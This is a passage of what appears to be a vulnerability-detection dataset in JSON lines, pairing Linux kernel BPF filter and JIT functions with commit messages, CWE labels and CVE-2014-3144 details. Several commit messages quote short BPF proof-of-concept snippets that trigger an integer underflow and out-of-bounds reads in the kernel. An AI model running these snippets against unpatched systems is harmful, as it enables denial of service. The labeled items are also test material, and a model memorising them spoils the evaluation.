ld\t#0x87654321\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--\n | ; (needs a fake netlink header at offset 0)\n | ld\t#0\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\nFix the first issue by ensuring the message length fulfills the minimal\nsize constrains of a nla header. Fix the second bug by getting the math\nfor the remainder calculation right.\n\nFixes: 4738c1db15 (\"[SKFILTER]: Add SKF_ADF_NLATTR instruction\")\nFixes: d214c7537b (\"filter: add SKF_AD_NLATTR_NEST to look for nested..\")\nCc: Patrick McHardy <kaber@trash.net>\nCc: Pablo Neira Ayuso <pablo@netfilter.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "static u64 __skb_get_nlattr_nest(u64 ctx, u64 A, u64 X, u64 r4, u64 r5)\n{\n\tstruct sk_buff *skb = (struct sk_buff *)(long) ctx;\n\tstruct nlattr *nla;\n\n \tif (skb_is_nonlinear(skb))\n \t\treturn 0;\n \n\tif (skb->len < sizeof(struct nlattr))\n\t\treturn 0;\n\n \tif (A > skb->len - sizeof(struct nlattr))\n \t\treturn 0;\n \n \tnla = (struct nlattr *) &skb->data[A];\n\tif (nla->nla_len > skb->len - A)\n \t\treturn 0;\n \n \tnla = nla_find_nested(nla, X);\n\tif (nla)\n\t\treturn (void *) nla - (void *) skb->data;\n\n\treturn 0;\n}\n", "func_hash": 238463992730366810608006902490121668996, "file_name": "filter.c", "file_hash": 293672119478249626027402742238224315253, "cwe": ["CWE-189"], "cve": "CVE-2014-3144", "cve_desc": "The (1) BPF_S_ANC_NLATTR and (2) BPF_S_ANC_NLATTR_NEST extension implementations in the sk_run_filter function in net/core/filter.c in the Linux kernel through 3.14.3 do not check whether a certain length value is sufficiently large, which allows local users to cause a denial of service (integer underflow and system crash) via crafted BPF instructions.  NOTE: the affected code was moved to the __skb_get_nlattr and __skb_get_nlattr_nest functions before the vulnerability was announced.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3144"}
{"idx": 184406, "project": "linux", "commit_id": "05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "commit_message": "filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check\nfor a minimal message length before testing the supplied offset to be\nwithin the bounds of the message. This allows the subtraction of the nla\nheader to underflow and therefore -- as the data type is unsigned --\nallowing far to big offset and length values for the search of the\nnetlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is\nalso wrong. It has the minuend and subtrahend mixed up, therefore\ncalculates a huge length value, allowing to overrun the end of the\nmessage while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to\na UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nla\n | ret\ta\n `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--\n | ; (needs a fake netlink header at offset 0)\n | ld\t#0\n | ldx\t#42\n | ld\t#nlan\n | ret\ta\n `---\n\nFix the first issue by ensuring the message length fulfills the minimal\nsize constrains of a nla header. Fix the second bug by getting the math\nfor the remainder calculation right.\n\nFixes: 4738c1db15 (\"[SKFILTER]: Add SKF_ADF_NLATTR instruction\")\nFixes: d214c7537b (\"filter: add SKF_AD_NLATTR_NEST to look for nested..\")\nCc: Patrick McHardy <kaber@trash.net>\nCc: Pablo Neira Ayuso <pablo@netfilter.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Daniel Borkmann <dborkman@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "static u64 __skb_get_nlattr(u64 ctx, u64 A, u64 X, u64 r4, u64 r5)\n{\n\tstruct sk_buff *skb = (struct sk_buff *)(long) ctx;\n\tstruct nlattr *nla;\n\n \tif (skb_is_nonlinear(skb))\n \t\treturn 0;\n \n\tif (skb->len < sizeof(struct nlattr))\n\t\treturn 0;\n\n \tif (A > skb->len - sizeof(struct nlattr))\n \t\treturn 0;\n \n\tnla = nla_find((struct nlattr *) &skb->data[A], skb->len - A, X);\n\tif (nla)\n\t\treturn (void *) nla - (void *) skb->data;\n\n\treturn 0;\n}\n", "func_hash": 77719296777876183697115486684403189323, "file_name": "filter.c", "file_hash": 293672119478249626027402742238224315253, "cwe": ["CWE-189"], "cve": "CVE-2014-3144", "cve_desc": "The (1) BPF_S_ANC_NLATTR and (2) BPF_S_ANC_NLATTR_NEST extension implementations in the sk_run_filter function in net/core/filter.c in the Linux kernel through 3.14.3 do not check whether a certain length value is sufficiently large, which allows local users to cause a denial of service (integer underflow and system crash) via crafted BPF instructions.  NOTE: the affected code was moved to the __skb_get_nlattr and __skb_get_nlattr_nest functions before the vulnerability was announced.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3144"}
{"idx": 159040, "project": "linux", "commit_id": "a03ffcf873fe0f2565386ca8ef832144c42e67fa", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/a03ffcf873fe0f2565386ca8ef832144c42e67fa", "commit_message": "net: bpf_jit: fix an off-one bug in x86_64 cond jump target\n\nx86 jump instruction size is 2 or 5 bytes (near/long jump), not 2 or 6\nbytes.\n\nIn case a conditional jump is followed by a long jump, conditional jump\ntarget is one byte past the start of target instruction.\n\nSigned-off-by: Markus Ktter <nepenthesdev@gmail.com>\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "void bpf_jit_compile(struct sk_filter *fp)\n{\n\tu8 temp[64];\n\tu8 *prog;\n\tunsigned int proglen, oldproglen = 0;\n\tint ilen, i;\n\tint t_offset, f_offset;\n\tu8 t_op, f_op, seen = 0, pass;\n\tu8 *image = NULL;\n\tu8 *func;\n\tint pc_ret0 = -1; /* bpf index of first RET #0 instruction (if any) */\n\tunsigned int cleanup_addr; /* epilogue code offset */\n\tunsigned int *addrs;\n\tconst struct sock_filter *filter = fp->insns;\n\tint flen = fp->len;\n\n\tif (!bpf_jit_enable)\n\t\treturn;\n\n\taddrs = kmalloc(flen * sizeof(*addrs), GFP_KERNEL);\n\tif (addrs == NULL)\n\t\treturn;\n\n\t/* Before first pass, make a rough estimation of addrs[]\n\t * each bpf instruction is translated to less than 64 bytes\n\t */\n\tfor (proglen = 0, i = 0; i < flen; i++) {\n\t\tproglen += 64;\n\t\taddrs[i] = proglen;\n\t}\n\tcleanup_addr = proglen; /* epilogue address */\n\n\tfor (pass = 0; pass < 10; pass++) {\n\t\t/* no prologue/epilogue for trivial filters (RET something) */\n\t\tproglen = 0;\n\t\tprog = temp;\n\n\t\tif (seen) {\n\t\t\tEMIT4(0x55, 0x48, 0x89, 0xe5); /* push %rbp; mov %rsp,%rbp */\n\t\t\tEMIT4(0x48, 0x83, 0xec, 96);\t/* subq  $96,%rsp\t*/\n\t\t\t/* note : must save %rbx in case bpf_error is hit */\n\t\t\tif (seen & (SEEN_XREG | SEEN_DATAREF))\n\t\t\t\tEMIT4(0x48, 0x89, 0x5d, 0xf8); /* mov %rbx, -8(%rbp) */\n\t\t\tif (seen & SEEN_XREG)\n\t\t\t\tCLEAR_X(); /* make sure we dont leek kernel memory */\n\n\t\t\t/*\n\t\t\t * If this filter needs to access skb data,\n\t\t\t * loads r9 and r8 with :\n\t\t\t *  r9 = skb->len - skb->data_len\n\t\t\t *  r8 = skb->data\n\t\t\t */\n\t\t\tif (seen & SEEN_DATAREF) {\n\t\t\t\tif (offsetof(struct sk_buff, len) <= 127)\n\t\t\t\t\t/* mov    off8(%rdi),%r9d */\n\t\t\t\t\tEMIT4(0x44, 0x8b, 0x4f, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\t/* mov    off32(%rdi),%r9d */\n\t\t\t\t\tEMIT3(0x44, 0x8b, 0x8f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, data_len)))\n\t\t\t\t\t/* sub    off8(%rdi),%r9d */\n\t\t\t\t\tEMIT4(0x44, 0x2b, 0x4f, offsetof(struct sk_buff, data_len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT3(0x44, 0x2b, 0x8f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, data_len), 4);\n\t\t\t\t}\n\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, data)))\n\t\t\t\t\t/* mov off8(%rdi),%r8 */\n\t\t\t\t\tEMIT4(0x4c, 0x8b, 0x47, offsetof(struct sk_buff, data));\n\t\t\t\telse {\n\t\t\t\t\t/* mov off32(%rdi),%r8 */\n\t\t\t\t\tEMIT3(0x4c, 0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, data), 4);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tswitch (filter[0].code) {\n\t\tcase BPF_S_RET_K:\n\t\tcase BPF_S_LD_W_LEN:\n\t\tcase BPF_S_ANC_PROTOCOL:\n\t\tcase BPF_S_ANC_IFINDEX:\n\t\tcase BPF_S_ANC_MARK:\n\t\tcase BPF_S_ANC_RXHASH:\n\t\tcase BPF_S_ANC_CPU:\n\t\tcase BPF_S_ANC_QUEUE:\n\t\tcase BPF_S_LD_W_ABS:\n\t\tcase BPF_S_LD_H_ABS:\n\t\tcase BPF_S_LD_B_ABS:\n\t\t\t/* first instruction sets A register (or is RET 'constant') */\n\t\t\tbreak;\n\t\tdefault:\n\t\t\t/* make sure we dont leak kernel information to user */\n\t\t\tCLEAR_A(); /* A = 0 */\n\t\t}\n\n\t\tfor (i = 0; i < flen; i++) {\n\t\t\tunsigned int K = filter[i].k;\n\n\t\t\tswitch (filter[i].code) {\n\t\t\tcase BPF_S_ALU_ADD_X: /* A += X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x01, 0xd8);\t\t/* add %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_ADD_K: /* A += K; */\n\t\t\t\tif (!K)\n\t\t\t\t\tbreak;\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xc0, K);\t/* add imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x05, K);\t/* add imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_SUB_X: /* A -= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x29, 0xd8);\t\t/* sub    %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_SUB_K: /* A -= K */\n\t\t\t\tif (!K)\n\t\t\t\t\tbreak;\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xe8, K); /* sub imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x2d, K); /* sub imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_MUL_X: /* A *= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT3(0x0f, 0xaf, 0xc3);\t/* imul %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_MUL_K: /* A *= K */\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x6b, 0xc0, K); /* imul imm8,%eax,%eax */\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x69, 0xc0);\t\t/* imul imm32,%eax */\n\t\t\t\t\tEMIT(K, 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_DIV_X: /* A /= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x85, 0xdb);\t/* test %ebx,%ebx */\n\t\t\t\tif (pc_ret0 != -1)\n\t\t\t\t\tEMIT_COND_JMP(X86_JE, addrs[pc_ret0] - (addrs[i] - 4));\n\t\t\t\telse {\n\t\t\t\t\tEMIT_COND_JMP(X86_JNE, 2 + 5);\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t\tEMIT1_off32(0xe9, cleanup_addr - (addrs[i] - 4)); /* jmp .+off32 */\n\t\t\t\t}\n\t\t\t\tEMIT4(0x31, 0xd2, 0xf7, 0xf3); /* xor %edx,%edx; div %ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_DIV_K: /* A = reciprocal_divide(A, K); */\n\t\t\t\tEMIT3(0x48, 0x69, 0xc0); /* imul imm32,%rax,%rax */\n\t\t\t\tEMIT(K, 4);\n\t\t\t\tEMIT4(0x48, 0xc1, 0xe8, 0x20); /* shr $0x20,%rax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_AND_X:\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x21, 0xd8);\t\t/* and %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_AND_K:\n\t\t\t\tif (K >= 0xFFFFFF00) {\n\t\t\t\t\tEMIT2(0x24, K & 0xFF); /* and imm8,%al */\n\t\t\t\t} else if (K >= 0xFFFF0000) {\n\t\t\t\t\tEMIT2(0x66, 0x25);\t/* and imm16,%ax */\n\t\t\t\t\tEMIT2(K, 2);\n\t\t\t\t} else {\n\t\t\t\t\tEMIT1_off32(0x25, K);\t/* and imm32,%eax */\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_OR_X:\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x09, 0xd8);\t\t/* or %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_OR_K:\n\t\t\t\tif (is_imm8(K))\n\t\t\t\t\tEMIT3(0x83, 0xc8, K); /* or imm8,%eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0x0d, K);\t/* or imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_LSH_X: /* A <<= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT4(0x89, 0xd9, 0xd3, 0xe0);\t/* mov %ebx,%ecx; shl %cl,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_LSH_K:\n\t\t\t\tif (K == 0)\n\t\t\t\t\tbreak;\n\t\t\t\telse if (K == 1)\n\t\t\t\t\tEMIT2(0xd1, 0xe0); /* shl %eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT3(0xc1, 0xe0, K);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_RSH_X: /* A >>= X; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT4(0x89, 0xd9, 0xd3, 0xe8);\t/* mov %ebx,%ecx; shr %cl,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_RSH_K: /* A >>= K; */\n\t\t\t\tif (K == 0)\n\t\t\t\t\tbreak;\n\t\t\t\telse if (K == 1)\n\t\t\t\t\tEMIT2(0xd1, 0xe8); /* shr %eax */\n\t\t\t\telse\n\t\t\t\t\tEMIT3(0xc1, 0xe8, K);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ALU_NEG:\n\t\t\t\tEMIT2(0xf7, 0xd8);\t\t/* neg %eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_RET_K:\n\t\t\t\tif (!K) {\n\t\t\t\t\tif (pc_ret0 == -1)\n\t\t\t\t\t\tpc_ret0 = i;\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t} else {\n\t\t\t\t\tEMIT1_off32(0xb8, K);\t/* mov $imm32,%eax */\n\t\t\t\t}\n\t\t\t\t/* fallinto */\n\t\t\tcase BPF_S_RET_A:\n\t\t\t\tif (seen) {\n\t\t\t\t\tif (i != flen - 1) {\n\t\t\t\t\t\tEMIT_JMP(cleanup_addr - addrs[i]);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tif (seen & SEEN_XREG)\n\t\t\t\t\t\tEMIT4(0x48, 0x8b, 0x5d, 0xf8);  /* mov  -8(%rbp),%rbx */\n\t\t\t\t\tEMIT1(0xc9);\t\t/* leaveq */\n\t\t\t\t}\n\t\t\t\tEMIT1(0xc3);\t\t/* ret */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_MISC_TAX: /* X = A */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x89, 0xc3);\t/* mov    %eax,%ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_MISC_TXA: /* A = X */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x89, 0xd8);\t/* mov    %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_IMM: /* A = K */\n\t\t\t\tif (!K)\n\t\t\t\t\tCLEAR_A();\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0xb8, K); /* mov $imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_IMM: /* X = K */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tif (!K)\n\t\t\t\t\tCLEAR_X();\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0xbb, K); /* mov $imm32,%ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_MEM: /* A = mem[K] : mov off8(%rbp),%eax */\n\t\t\t\tseen |= SEEN_MEM;\n\t\t\t\tEMIT3(0x8b, 0x45, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_MEM: /* X = mem[K] : mov off8(%rbp),%ebx */\n\t\t\t\tseen |= SEEN_XREG | SEEN_MEM;\n\t\t\t\tEMIT3(0x8b, 0x5d, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ST: /* mem[K] = A : mov %eax,off8(%rbp) */\n\t\t\t\tseen |= SEEN_MEM;\n\t\t\t\tEMIT3(0x89, 0x45, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_STX: /* mem[K] = X : mov %ebx,off8(%rbp) */\n\t\t\t\tseen |= SEEN_XREG | SEEN_MEM;\n\t\t\t\tEMIT3(0x89, 0x5d, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_LEN: /*\tA = skb->len; */\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, len) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, len)))\n\t\t\t\t\t/* mov    off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_W_LEN: /* X = skb->len; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, len)))\n\t\t\t\t\t/* mov off8(%rdi),%ebx */\n\t\t\t\t\tEMIT3(0x8b, 0x5f, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x8b, 0x9f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_PROTOCOL: /* A = ntohs(skb->protocol); */\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, protocol) != 2);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, protocol))) {\n\t\t\t\t\t/* movzwl off8(%rdi),%eax */\n\t\t\t\t\tEMIT4(0x0f, 0xb7, 0x47, offsetof(struct sk_buff, protocol));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x0f, 0xb7, 0x87); /* movzwl off32(%rdi),%eax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, protocol), 4);\n\t\t\t\t}\n\t\t\t\tEMIT2(0x86, 0xc4); /* ntohs() : xchg   %al,%ah */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_IFINDEX:\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, dev))) {\n\t\t\t\t\t/* movq off8(%rdi),%rax */\n\t\t\t\t\tEMIT4(0x48, 0x8b, 0x47, offsetof(struct sk_buff, dev));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x48, 0x8b, 0x87); /* movq off32(%rdi),%rax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, dev), 4);\n\t\t\t\t}\n\t\t\t\tEMIT3(0x48, 0x85, 0xc0);\t/* test %rax,%rax */\n\t\t\t\tEMIT_COND_JMP(X86_JE, cleanup_addr - (addrs[i] - 6));\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct net_device, ifindex) != 4);\n\t\t\t\tEMIT2(0x8b, 0x80);\t/* mov off32(%rax),%eax */\n\t\t\t\tEMIT(offsetof(struct net_device, ifindex), 4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_MARK:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, mark) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, mark))) {\n\t\t\t\t\t/* mov off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, mark));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, mark), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_RXHASH:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, rxhash) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, rxhash))) {\n\t\t\t\t\t/* mov off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, rxhash));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, rxhash), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_QUEUE:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, queue_mapping) != 2);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, queue_mapping))) {\n\t\t\t\t\t/* movzwl off8(%rdi),%eax */\n\t\t\t\t\tEMIT4(0x0f, 0xb7, 0x47, offsetof(struct sk_buff, queue_mapping));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x0f, 0xb7, 0x87); /* movzwl off32(%rdi),%eax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, queue_mapping), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_CPU:\n#ifdef CONFIG_SMP\n\t\t\t\tEMIT4(0x65, 0x8b, 0x04, 0x25); /* mov %gs:off32,%eax */\n\t\t\t\tEMIT((u32)(unsigned long)&cpu_number, 4); /* A = smp_processor_id(); */\n#else\n\t\t\t\tCLEAR_A();\n#endif\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_ABS:\n\t\t\t\tfunc = sk_load_word;\ncommon_load:\t\t\tseen |= SEEN_DATAREF;\n\t\t\t\tif ((int)K < 0)\n\t\t\t\t\tgoto out;\n\t\t\t\tt_offset = func - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K); /* mov imm32,%esi */\n\t\t\t\tEMIT1_off32(0xe8, t_offset); /* call */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_H_ABS:\n\t\t\t\tfunc = sk_load_half;\n\t\t\t\tgoto common_load;\n\t\t\tcase BPF_S_LD_B_ABS:\n\t\t\t\tfunc = sk_load_byte;\n\t\t\t\tgoto common_load;\n\t\t\tcase BPF_S_LDX_B_MSH:\n\t\t\t\tif ((int)K < 0) {\n\t\t\t\t\tif (pc_ret0 != -1) {\n\t\t\t\t\t\tEMIT_JMP(addrs[pc_ret0] - addrs[i]);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t\tEMIT_JMP(cleanup_addr - addrs[i]);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tseen |= SEEN_DATAREF | SEEN_XREG;\n\t\t\t\tt_offset = sk_load_byte_msh - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K);\t/* mov imm32,%esi */\n\t\t\t\tEMIT1_off32(0xe8, t_offset); /* call sk_load_byte_msh */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_IND:\n\t\t\t\tfunc = sk_load_word_ind;\ncommon_load_ind:\t\tseen |= SEEN_DATAREF | SEEN_XREG;\n\t\t\t\tt_offset = func - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K);\t/* mov imm32,%esi   */\n\t\t\t\tEMIT1_off32(0xe8, t_offset);\t/* call sk_load_xxx_ind */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_H_IND:\n\t\t\t\tfunc = sk_load_half_ind;\n\t\t\t\tgoto common_load_ind;\n\t\t\tcase BPF_S_LD_B_IND:\n\t\t\t\tfunc = sk_load_byte_ind;\n\t\t\t\tgoto common_load_ind;\n\t\t\tcase BPF_S_JMP_JA:\n\t\t\t\tt_offset = addrs[i + K] - addrs[i];\n\t\t\t\tEMIT_JMP(t_offset);\n\t\t\t\tbreak;\n\t\t\tCOND_SEL(BPF_S_JMP_JGT_K, X86_JA, X86_JBE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGE_K, X86_JAE, X86_JB);\n\t\t\tCOND_SEL(BPF_S_JMP_JEQ_K, X86_JE, X86_JNE);\n\t\t\tCOND_SEL(BPF_S_JMP_JSET_K,X86_JNE, X86_JE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGT_X, X86_JA, X86_JBE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGE_X, X86_JAE, X86_JB);\n\t\t\tCOND_SEL(BPF_S_JMP_JEQ_X, X86_JE, X86_JNE);\n\t\t\tCOND_SEL(BPF_S_JMP_JSET_X,X86_JNE, X86_JE);\n\ncond_branch:\t\t\tf_offset = addrs[i + filter[i].jf] - addrs[i];\n\t\t\t\tt_offset = addrs[i + filter[i].jt] - addrs[i];\n\n\t\t\t\t/* same targets, can avoid doing the test :) */\n\t\t\t\tif (filter[i].jt == filter[i].jf) {\n\t\t\t\t\tEMIT_JMP(t_offset);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tswitch (filter[i].code) {\n\t\t\t\tcase BPF_S_JMP_JGT_X:\n\t\t\t\tcase BPF_S_JMP_JGE_X:\n\t\t\t\tcase BPF_S_JMP_JEQ_X:\n\t\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\t\tEMIT2(0x39, 0xd8); /* cmp %ebx,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JSET_X:\n\t\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\t\tEMIT2(0x85, 0xd8); /* test %ebx,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JEQ_K:\n\t\t\t\t\tif (K == 0) {\n\t\t\t\t\t\tEMIT2(0x85, 0xc0); /* test   %eax,%eax */\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tcase BPF_S_JMP_JGT_K:\n\t\t\t\tcase BPF_S_JMP_JGE_K:\n\t\t\t\t\tif (K <= 127)\n\t\t\t\t\t\tEMIT3(0x83, 0xf8, K); /* cmp imm8,%eax */\n\t\t\t\t\telse\n\t\t\t\t\t\tEMIT1_off32(0x3d, K); /* cmp imm32,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JSET_K:\n\t\t\t\t\tif (K <= 0xFF)\n\t\t\t\t\t\tEMIT2(0xa8, K); /* test imm8,%al */\n\t\t\t\t\telse if (!(K & 0xFFFF00FF))\n\t\t\t\t\t\tEMIT3(0xf6, 0xc4, K >> 8); /* test imm8,%ah */\n\t\t\t\t\telse if (K <= 0xFFFF) {\n\t\t\t\t\t\tEMIT2(0x66, 0xa9); /* test imm16,%ax */\n\t\t\t\t\t\tEMIT(K, 2);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tEMIT1_off32(0xa9, K); /* test imm32,%eax */\n\t\t\t\t\t}\n \t\t\t\t\tbreak;\n \t\t\t\t}\n \t\t\t\tif (filter[i].jt != 0) {\n\t\t\t\t\tif (filter[i].jf && f_offset)\n\t\t\t\t\t\tt_offset += is_near(f_offset) ? 2 : 5;\n \t\t\t\t\tEMIT_COND_JMP(t_op, t_offset);\n \t\t\t\t\tif (filter[i].jf)\n \t\t\t\t\t\tEMIT_JMP(f_offset);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tEMIT_COND_JMP(f_op, 